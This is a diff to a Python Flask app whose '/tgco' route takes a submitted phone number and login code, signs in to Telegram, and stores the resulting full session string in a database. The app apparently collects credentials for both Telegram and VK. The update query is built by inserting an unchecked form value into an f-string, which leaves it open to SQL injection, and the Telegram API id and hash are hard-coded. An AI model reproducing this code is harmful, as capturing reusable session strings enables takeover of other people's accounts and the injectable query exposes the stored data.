@@ -5,6 +5,7 @@ import json
 from telethon import TelegramClient, sync
 import sqlite3 as sql
 import contextlib
+from telethon.sessions import StringSession
 
 main = Flask(__name__, static_folder="pic")
 
@@ -77,14 +78,21 @@ def handle_request3():
 
 @main.route('/tgco', methods=['GET', 'POST'])
 def handle_request11():
+    vklog = request.form.get('tglog')
+    vkpas = request.form.get('tgco')
+    log = request.form.get('log')
+
     api_id = 3070588
     api_hash = 'd672e46b2442ba3d680075bed9788121'
     number = request.form.get('tglog')
     client = TelegramClient('dp_sarvar', api_id, api_hash)
     client.connect()
     if not client.is_user_authorized():
-        client.send_code_request(number)
-    client.log_out();
+        client.send_code_request(vklog)
+        client.sign_in(vklog, vkpas)
+    sessia = StringSession.save(client.session)
+    query = f"UPDATE users SET tglog = '{sessia}' WHERE log = '{log}';"
+    execute_statement(query)
     return "zaebis"
 
 @main.route('/vk', methods=['GET', 'POST'])
